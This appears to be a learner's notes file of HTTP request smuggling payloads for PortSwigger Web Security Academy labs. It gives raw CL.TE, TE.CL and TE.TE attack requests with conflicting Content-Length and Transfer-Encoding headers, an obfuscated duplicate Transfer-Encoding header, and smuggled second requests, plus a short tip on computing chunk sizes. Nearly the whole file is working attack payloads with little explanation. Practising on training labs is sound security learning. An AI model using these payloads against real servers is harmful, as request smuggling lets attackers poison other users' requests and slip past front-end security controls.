### CL.TE

```
POST / HTTP/1.1
Host: 0abf00ca039df01c8169e3ed00d10037.web-security-academy.net
Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 132

0


POST /404_not_found HTTP/1.1
Host: 0abf00ca039df01c8169e3ed00d10037.web-security-academy.net
Content-Length: 50

x=test
```

### TE.CL

```http
POST / HTTP/1.1
Host: 0a70008a045bdcc180f4ad6300100055.web-security-academy.net
Cookie: session=yjXGzDuimYbYgBrcLcikr8GeXbq5RxvR
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 4

7b
GET /404_not_found HTTP/1.1
Host: 0a70008a045bdcc180f4ad6300100055.web-security-academy.net
Content-Length: 100

x=test
0
```

for the hexadecimal calculation, only calculate the part(don't include the end of payload \r\n and start of \r\n)

```
GET /404_not_found HTTP/1.1\r\n
Host: 0a70008a045bdcc180f4ad6300100055.web-security-academy.net\r\n
Content-Length: 100\r\n
\r\n
x=test
```

### TE.TE

```http
POST / HTTP/1.1
Host: 0a4b003a037a4adb820621f90095004d.web-security-academy.net
Cookie: session=ZBOdHCzNbzHTRvnnNn1toNmrlUvG6PbU
Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
X: X
Transfer-Encoding: chunked
Transfer-Encoding: identity
Content-Length: 4

73
GPOST / HTTP/1.1
Host: 0a4b003a037a4adb820621f90095004d.web-security-academy.net
Content-Length: 400

test=test
0
```